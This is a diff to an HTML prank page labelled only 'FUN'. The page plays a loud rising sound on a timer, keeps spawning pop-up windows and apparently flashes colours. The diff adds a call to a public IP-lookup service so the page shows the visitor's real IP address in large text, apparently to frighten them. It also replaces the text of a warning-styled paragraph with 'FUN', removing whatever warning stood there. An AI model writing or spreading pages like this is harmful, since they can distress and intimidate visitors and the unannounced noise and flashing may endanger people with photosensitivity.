@@ -3,32 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>fun/title>
+<title>FUN</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { height: 100%; width: 100%; overflow: hidden; background: #000; cursor: pointer; }
+  html, body { height: 100%; width: 100%; overflow: hidden; background: #000; cursor: pointer; font-family: Arial, sans-serif; }
   #flash { position: fixed; inset: 0; background: #000; }
+  #ip-text {
+    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    color: white; font-size: 42px; font-weight: bold; text-shadow: 0 0 20px black;
+    z-index: 20; text-align: center; pointer-events: none;
+  }
   #overlay {
     position: fixed; inset: 0; display: flex; flex-direction: column;
     align-items: center; justify-content: center; text-align: center;
-    background: #060606; color: #eee; z-index: 10; padding: 30px;
+    background: #060606; color: #eee; z-index: 30; padding: 30px;
   }
   .warn { color: #ffcc00; font-size: 17px; max-width: 500px; margin: 20px 0; }
 </style>
 </head>
 <body>
   <div id="flash"></div>
+  <div id="ip-text">FUN</div>
 
   <div id="overlay">
-    <h1 style="font-size:60px; letter-spacing:4px;">CLICK TO START</h1>
-    <p class="warn">fun</p>
-    <p style="color:#888;">fun</p>
+    <h1 style="font-size:60px; letter-spacing:4px;">FUN</h1>
+    <p class="warn">FUN</p>
+    <p style="color:#888;">FUN</p>
   </div>
 
 <script>
   let running = false;
   let windows = [];
   let soundTimer = null;
+
+  // Show real IP
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById('ip-text').textContent = 'YOUR IP: ' + data.ip;
+    })
+    .catch(() => {
+      document.getElementById('ip-text').textContent = 'IP: Unable to load';
+    });
 
   function randomColor() {
     return `hsl(${Math.floor(Math.random() * 360)}, 100%, 50%)`;
@@ -70,12 +86,10 @@
     playLoudRise();
     soundTimer = setInterval(playLoudRise, 1950);
 
-    // Initial burst
     for (let i = 0; i < 5; i++) {
       setTimeout(createCrazyWindow, i * 200);
     }
 
-    // Keep spawning from main
     setInterval(createCrazyWindow, 1800);
   });
 
